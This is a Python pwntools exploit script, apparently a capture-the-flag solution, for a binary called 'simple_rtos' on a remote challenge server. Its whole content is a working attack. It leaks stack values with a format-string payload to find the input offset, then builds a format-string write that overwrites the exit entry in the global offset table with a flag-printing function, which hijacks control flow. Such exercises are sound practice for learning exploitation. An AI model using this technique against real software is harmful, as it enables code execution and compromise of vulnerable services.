#!/usr/bin/env python3
from pwn import *

context.binary = ELF('./simple_rtos')
binary = context.binary
context.log_level = 'debug'

putFlag = binary.symbols['putFlag']
exit_got = binary.got['exit']

# Start process
# p = process('./simple_rtos')
p = remote('140.113.207.245', 30175)

# Leak to verify offset
payload = b"AAAA." + b".".join(f"%{i}$p".encode() for i in range(1, 40))
p.sendlineafter(b"> ", payload)
p.recvuntil(b"You entered: ")
leak = p.recvline().split(b".")

# Correct offset is 12 (based on 'AAAA' at %12$p)
offset = 12

# Overwrite exit@GOT with putFlag
writes = {exit_got: putFlag}
fmt_payload = fmtstr_payload(offset, writes, write_size='short')

# Send format string
p.sendlineafter(b"> ", fmt_payload)

# Trigger 'exit' to invoke putFlag
p.sendlineafter(b"> ", b"exit")

# Read the flag and split the flag into two parts
parts = p.recvall().decode().strip().split('\n')

if len(parts) >= 3:
    user_input = parts[0] + "\\n" + parts[1]  # "You entered: exit\nExiting..."
    actual_flag = parts[2]  # "CSC2025{...}"
    print(f"User input part: {user_input}\nActual flag part: {actual_flag}")
    print(f"\033[93;1mFlag: {actual_flag}\033[0m")
else:
    print(f"\033[93;1m{parts}\033[0m")

# Close the connection
p.close()
